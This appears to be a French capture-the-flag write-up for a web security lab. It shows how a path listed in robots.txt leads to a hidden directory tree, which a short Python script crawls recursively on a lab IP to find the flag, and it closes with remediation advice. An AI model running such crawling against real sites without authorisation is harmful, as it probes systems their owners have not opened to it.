Pour ce flag il faut regarder ce qu'il y a dans le fichier /robots.txt du site.

On peut y trouver un dossier nommé /.hidden/. En se rendant dessus on trouve liste de dossier contenant chacun une liste de sous-dossiers et ainsi de suite. Ici le but est donc de trouver un moyen de parcourir tous ces dossiers jusqu'a trouver le flag. Pour ce faire on utilise un script pyhton :

import urllib.request, re

def crawl(url):
    try:
        html = urllib.request.urlopen(url).read().decode()
        links = re.findall(r'href=\"([^\"]+)\"', html)
        for link in links:
            if link in ('../', '/'):
                continue
            full = url + link
            if link.endswith('/'):
                crawl(full)
            else:
                content = urllib.request.urlopen(full).read().decode()
                if 'flag' in content.lower():
                    print('FOUND:', full)
                    print(content)
    except: pass

crawl('http://192.168.64.2/.hidden/')

Pour se protéger de ce genre de faille il ne faut pas mettre de dossiers/fichiers sensible dans le fichier robots.txt car il est public par définition. On peut aussi désactiver le directory listing